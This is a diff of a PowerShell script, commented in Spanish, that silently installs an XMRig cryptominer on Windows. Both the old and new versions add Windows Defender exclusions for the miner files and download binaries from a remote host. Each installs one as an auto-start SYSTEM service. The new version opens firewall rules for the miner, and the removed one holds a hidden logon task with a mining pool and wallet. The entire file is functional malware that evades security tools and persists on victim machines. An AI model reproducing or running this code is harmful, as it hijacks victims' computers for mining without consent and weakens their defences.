@@ -1,64 +1,45 @@
-# Este script crea un directorio, configura exclusiones, descarga archivos,
-# instala un servicio y crea una tarea programada, todo de manera silenciosa y en segundo plano.
-# Debe ejecutarse con permisos de administrador.
+$baseURL = "https://baa4ts.is-a-good.dev"
 
-# Definir la variable de la ruta raíz.
-$root = "$env:APPDATA\Wik"
 
-# Definir la URL base para las descargas.
-$baseUrl = "https://baa4ts.is-a-good.dev/"
+# Variables
+$root = Join-Path $env:WINDIR -ChildPath "events"
 
-# Lista de archivos a procesar.
-$filesToProcess = @(
-    "xmrig.exe",
-    "wroom.dll",
-    "WinRing0x64.sys",
-    "Win2Internals.exe"
-)
+# Archivos
+$xmrig = (Join-Path -Path $root -ChildPath "xmrig.exe")
+$Win2 = (Join-Path -Path $root -ChildPath "Win2Internals.exe")
+$wroom = (Join-Path -Path $root -ChildPath "wroom.dll")
+$WinRing = (Join-Path -Path $root -ChildPath "WinRing0x64.sys")
 
-# ---
-# 1. Crear el directorio si no existe.
-New-Item -Path $root -ItemType Directory -Force | Out-Null
-
-# ---
-# 2. Agregar la carpeta y archivos a las exclusiones de Windows Defender.
-Add-MpPreference -ExclusionPath $root | Out-Null
-foreach ($file in $filesToProcess) {
-    Add-MpPreference -ExclusionPath "$root\$file" | Out-Null
+# Crear la carpeta si no existe
+if (-not (Test-Path -Path $root)) 
+{
+    New-Item -Path $root -ItemType Directory
 }
 
-# ---
-# 3. Excluir los procesos de Windows Defender.
-$processesToExclude = @(
-    "xmrig.exe",
-    "Win2Internals.exe"
-)
-foreach ($process in $processesToExclude) {
-    Add-MpPreference -ExclusionProcess $process | Out-Null
-}
+# Establecer la variable de entorno
+setx WINUSERNAME $env:USERNAME /M
 
-# ---
-# 4. Descargar los archivos a la carpeta raíz.
-foreach ($file in $filesToProcess) {
-    $url = "$baseUrl$file"
-    $destination = "$root\$file"
-    Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
-}
+# Exclusiones de path
+Add-MpPreference -ExclusionPath $root
+Add-MpPreference -ExclusionPath $Win2
+Add-MpPreference -ExclusionPath $xmrig
+Add-MpPreference -ExclusionPath $wroom
+Add-MpPreference -ExclusionPath $WinRing
 
-# ---
-# 5. Instalar Win2Internals.exe como un servicio de Windows para inicio automático.
-$serviceName = "Win2InternalsService"
-$executablePath = "$root\Win2Internals.exe"
-sc.exe create $serviceName binPath= "`"$executablePath`"" start= auto obj= "NT AUTHORITY\SYSTEM" | Out-Null
+# Exclusiones de procesos
+Add-MpPreference -ExclusionProcess "xmrig.exe"
+Add-MpPreference -ExclusionProcess "Win2Internals.exe"
 
-# ---
-# 6. Crear una tarea programada para ejecutar xmrig.exe en segundo plano.
-$taskName = "XMRigMiner"
-$xmrigPath = "$root\xmrig.exe"
-$xmrigArguments = "-o rx.unmineable.com:3333 -a rx -k -u DOGE:DHJTrDmStC75AHU7AsZA7fzmtR8c4QT8Wk.LUISPC -p x --threads=1 --cpu-priority=1"
+# Firewall exclusiones
+New-NetFirewallRule -DisplayName "Entrada XMRIG" -Direction Inbound -Program $xmrig -Action Allow -Profile Any
+New-NetFirewallRule -DisplayName "Salida XMRIG" -Direction Outbound -Program $Win2 -Action Allow -Profile Any
 
-# Se usa PowerShell para ejecutar el proceso en segundo plano.
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -Command `"Start-Process -FilePath '$xmrigPath' -ArgumentList '$xmrigArguments' -NoNewWindow`""
-$trigger = New-ScheduledTaskTrigger -AtLogon
+# Descargar
+Start-BitsTransfer -Source "$baseURL/Win2Internals.exe" -Destination $Win2
+Start-BitsTransfer -Source "$baseURL/WinRing0x64.sys" -Destination $WinRing
+Start-BitsTransfer -Source "$baseURL/wroom.dll" -Destination $wroom
+Start-BitsTransfer -Source "$baseURL/xmrig.exe" -Destination $xmrig
 
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
+# Crear el servicio
+sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
+## sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
